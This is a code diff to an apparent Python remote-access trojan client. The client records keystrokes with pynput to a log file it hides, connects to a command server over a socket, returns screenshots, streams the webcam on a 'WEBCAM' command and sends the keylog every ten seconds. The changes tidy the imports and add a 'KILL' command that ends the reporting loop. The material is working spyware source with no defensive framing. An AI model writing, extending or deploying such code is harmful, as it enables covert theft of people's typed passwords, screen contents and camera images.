@@ -1,7 +1,20 @@
-import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui, threading, json, base64, cv2
+import base64
+import ctypes
+import cv2
+import datetime
+import io
+import json
+import logging
+import os
+import platform
+import pyautogui
+import socket
+import threading
+import time
 
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 
+stop = False
 
 # Function to get the operating system of the client
 def get_os():
@@ -143,11 +156,21 @@ def receive_commands(sock):
                         'screenshot': screenshot_encoded
                     }
                     json_data = json.dumps(client_info)
-                    sock.sendall(json_data.encode())
+                    sock.send(json_data.encode())
 
                 if command_type == 'WEBCAM':
                     webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock,))
                     webcam_thread.start()
+
+                if command_type == 'KILL':
+                    global stop
+                    stop = True
+                    client_info = {
+                        'command': 'KILL',
+                        "stop": stop
+                    }
+                    json_data = json.dumps(client_info)
+                    sock.send(json_data.encode())
 
             except json.JSONDecodeError as e:
                 print(f"JSON decode error: {e}")
@@ -157,10 +180,10 @@ def receive_commands(sock):
 
 
 def main():
+    global stop
     host = 'localhost'
     port = 9809
     current_hour = datetime.datetime.now().strftime("%Hh")
-    ip = str(socket.gethostbyname(socket.gethostname()))
     filename = f'{current_hour}_keyboard.log'
     setup_logging(filename)
     hide_file(filename)
@@ -174,7 +197,7 @@ def main():
         command_thread = threading.Thread(target=receive_commands, args=(sock,))
         command_thread.start()
 
-        while True:
+        while not stop:
             send_log_message(sock, filename)
             time.sleep(10)
 
